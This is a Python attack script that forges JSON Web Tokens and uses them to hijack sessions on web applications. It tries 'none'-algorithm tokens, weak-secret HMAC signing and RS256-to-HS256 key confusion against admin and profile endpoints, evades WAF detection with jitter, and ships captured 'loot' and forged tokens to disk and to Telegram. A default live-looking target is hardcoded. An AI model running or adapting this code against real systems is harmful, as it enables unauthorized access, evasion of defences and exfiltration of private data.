#!/usr/bin/env python3
"""
SESSION_HIJACK.PY v8.6 — Advanced Session Forging & Privilege Escalation Module (Elite Red Team Adversarial Edition)
Features:
- Multi-vector session injection (Bearer Auth headers + Cookie Jar session injection + Custom headers)
- Cryptographic JWT secret dictionary cracking, algorithm downgrade ('none'), and JWKS Key Confusion (RS256 -> HS256)
- Poisson behavioral jitter and randomized client hint injection for advanced WAF evasion
- Strict response schema validation (Zero false-positives: verifies JSON privilege objects & differential sizes)
- Automated immutable disk exfiltration (loot_output/) with SHA-256 cryptographic integrity hashing
- Real-time asynchronous Telegram notification dispatch for unredacted session loot & forged tokens
"""
import asyncio
import sys
import json
import base64
import hmac
import hashlib
import httpx
from urllib.parse import urlsplit

# Import centralized loot exfiltration, telemetry streaming, behavioral mimicry, and Telegram broadcaster
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

COMMON_SECRETS = [
    "secret", "password", "jwt_secret", "changeme", "admin123", 
    "supersecret", "123456", "token", "api_key", "cryptobytes",
    "laravel", "app_key", "app_secret", "secretkey", "development",
    "production", "jwt_signing_key", "auth_secret", "my_precious",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "default_secret", "random_secret"
]

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
}

def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

def sign_hs256(header_payload_str, secret):
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    signature = hmac.new(secret, header_payload_str.encode("utf-8"), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")

async def establish_baseline(client, base_url, endpoints):
    """Establishes an unauthenticated baseline response size and content for differential comparison."""
    baselines = {}
    for endpoint in endpoints:
        apply_behavioral_jitter()
        try:
            resp = await client.get(f"{base_url}{endpoint}", headers=get_randomized_hints())
            baselines[endpoint] = {
                "status": resp.status_code,
                "length": len(resp.text),
                "text": resp.text[:500]
            }
        except Exception:
            pass
    return baselines

async def fetch_jwks_public_key(client, base_url):
    """Attempts to fetch JWKS public key for advanced Key Confusion attacks (RS256 -> HS256)."""
    jwks_paths = ["/.well-known/jwks.json", "/api/jwks.json", "/oauth/jwks.json"]
    for path in jwks_paths:
        try:
            apply_behavioral_jitter()
            resp = await client.get(f"{base_url}{path}", headers=get_randomized_hints())
            if resp.status_code == 200:
                data = resp.json()
                if "keys" in data or "n" in data:
                    return resp.text
        except Exception:
            pass
    return None

async def run_session_hijack(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING ELITE SESSION HIJACKING & TOKEN FORGING MODULE (WAF HARDENED) [***]", "MAGENTA")
    
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    hijack_findings = []
    target_endpoints = ["/admin", "/dashboard", "/api/admin", "/api/user/profile", "/api/v1/user/profile", "/api/settings"]

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0) as client:
        log("[*] Establishing unauthenticated baseline responses for differential comparison...", "CYAN")
        baselines = await establish_baseline(client, base_url, target_endpoints)

        # Fetch JWKS public key for key confusion if available
        jwks_content = await fetch_jwks_public_key(client, base_url)
        if jwks_content:
            log("[+] Discovered JWKS endpoint! Adding public-key bytes to cryptographic key confusion dictionary.", "GREEN")
            COMMON_SECRETS.append(jwks_content)

        # 1. Generate 'none' algorithm token
        log("[*] Generating forged admin/superuser JWT payloads with 'none' algorithm...", "CYAN")
        header_none = base64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
        payload_data = {"user": "admin", "role": "superuser", "isAdmin": True, "sub": "admin_bypass", "permissions": ["all"]}
        payload = base64url_encode(json.dumps(payload_data))
        forged_jwt_none = f"{header_none}.{payload}."
        
        # 2. Generate HMAC weak secret tokens across dictionary secrets
        header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
        header_payload_str = f"{header_hs}.{payload}"
        
        tokens_to_test = [
            ("None Algorithm Bypass", forged_jwt_none)
        ]
        
        for secret in COMMON_SECRETS:
            sig = sign_hs256(header_payload_str, secret)
            forged_jwt_hs = f"{header_payload_str}.{sig}"
            tokens_to_test.append((f"HMAC Secret Brute-Force [{str(secret)[:15]}...] WAF-Bypassed", forged_jwt_hs))

        log(f"[*] Actively injecting {len(tokens_to_test)} forged tokens across {len(target_endpoints)} endpoints with behavioral jitter...", "CYAN")

        for vector_name, token in tokens_to_test:
            if not token:
                continue
            for endpoint in target_endpoints:
                url = f"{base_url}{endpoint}"
                apply_behavioral_jitter()
                
                random_hints = get_randomized_hints()
                headers_variants = [
                    {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", **random_hints},
                    {"X-Access-Token": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", **random_hints},
                    {"X-Api-Key": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", **random_hints}
                ]
                cookies_variant = {"token": token, "session": token, "jwt": token, "access_token": token}

                for headers in headers_variants:
                    try:
                        response = await client.get(url, headers=headers, cookies=cookies_variant)
                        status = response.status_code
                        body = response.text
                        
                        is_landing_shell = (
                            "<div id=\"root\"></div>" in body or 
                            "<div id=\"__next\"></div>" in body or 
                            "<div id=\"__nuxt\"></div>" in body or
                            "login-form" in body.lower() or
                            "sign in" in body.lower()
                        )
                        
                        baseline = baselines.get(endpoint, {"status": 404, "length": 0})
                        is_differential_match = (
                            status == 200 and 
                            not is_landing_shell and 
                            abs(len(body) - baseline["length"]) > 50
                        )

                        has_elevated_json = False
                        extracted_json_data = {}
                        try:
                            json_data = response.json()
                            if isinstance(json_data, dict):
                                extracted_json_data = json_data
                                if any(k in json_data for k in ["users", "admin", "balance", "transactions", "secret_key", "config", "role", "permissions"]):
                                    has_elevated_json = True
                        except Exception:
                            pass

                        if (status == 200 and not is_landing_shell) and (has_elevated_json or is_differential_match):
                            log(f"[!!!] GENUINE BREACH CONFIRMED AT {endpoint} USING {vector_name} [!!!]", "RED")
                            
                            loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                            loot_payload = {
                                "vector": vector_name,
                                "endpoint": endpoint,
                                "status": status,
                                "forged_token": token,
                                "integrity_hash": loot_hash,
                                "extracted_data": extracted_json_data or body[:400]
                            }

                            # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
                            broadcast_tg_alert_sync(f"Verified Session Hijack ({vector_name})", loot_payload)
                            stream_proof("SESSION_HIJACK_BREACH", endpoint, {"vector": vector_name, "token": token}, body, extracted_json_data or {"status": status})
                            save_session_loot(
                                target=base_url,
                                endpoint=endpoint,
                                finding_type=f"SESSION_HIJACK_{vector_name.replace(' ', '_').upper()}",
                                status=status,
                                headers=dict(response.headers),
                                body=body,
                                extra_loot=loot_payload
                            )

                            hijack_findings.append({
                                "vector": vector_name,
                                "endpoint": endpoint,
                                "forged_token": token,
                                "status": "VERIFIED_ACCESS",
                                "integrity_hash": loot_hash,
                                "response_snippet": body[:300]
                            })
                            break
                        else:
                            log(f"[-] Endpoint {endpoint} rejected {vector_name} (Status: {status})", "GRAY")
                    except Exception as exc:
                        pass

    if not hijack_findings:
        log("[-] Session hijacking audit complete. Target successfully enforced strict cryptographic verification with zero false positives.", "YELLOW")
    else:
        log(f"[+] Confirmed and validated {len(hijack_findings)} genuine session bypass vulnerabilities!", "GREEN")

    return hijack_findings

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobyte.online"
    asyncio.run(run_session_hijack(target))
